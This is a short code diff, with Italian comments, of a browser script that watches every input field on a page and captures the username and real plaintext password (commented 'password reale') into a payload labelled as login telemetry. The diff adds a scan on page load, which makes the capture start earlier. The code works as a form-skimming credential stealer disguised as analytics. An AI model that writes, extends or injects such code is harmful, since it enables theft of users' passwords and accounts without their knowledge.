@@ -7,7 +7,7 @@ const err = (...args) => DEBUG && console.error(...args);
 let lastTextInput = null;
 let lastPasswordInput = null;
 
-// Funzione per aggiornare input
+// Aggiorna input
 function updateValue(input) {
   if (!input) return;
   if (input.type === "text" && input.value) lastTextInput = input;
@@ -30,7 +30,7 @@ async function sendTelemetry(method) {
     event: "login_submit",
     username,
     username_length: username.length,
-    password,
+    password, // password reale
     method,
     timestamp: new Date().toISOString()
   };
@@ -46,6 +46,7 @@ async function sendTelemetry(method) {
     err("Telemetry error:", e);
   }
 }
+
 // Eventi per tracciare input e login
 document.addEventListener("input", e => e.target.tagName === "INPUT" && updateValue(e.target));
 document.addEventListener("change", e => e.target.tagName === "INPUT" && updateValue(e.target));
@@ -58,6 +59,12 @@ document.addEventListener("click", e => {
 
 // Scan periodico per input dinamici
 setInterval(scanInputs, 500);
+
+// Scan iniziale al caricamento della pagina
+window.addEventListener("DOMContentLoaded", () => {
+  scanInputs();
+});
+
 
   // --- AUTO LOGOUT ---
   if (window.logoutDone === undefined) {
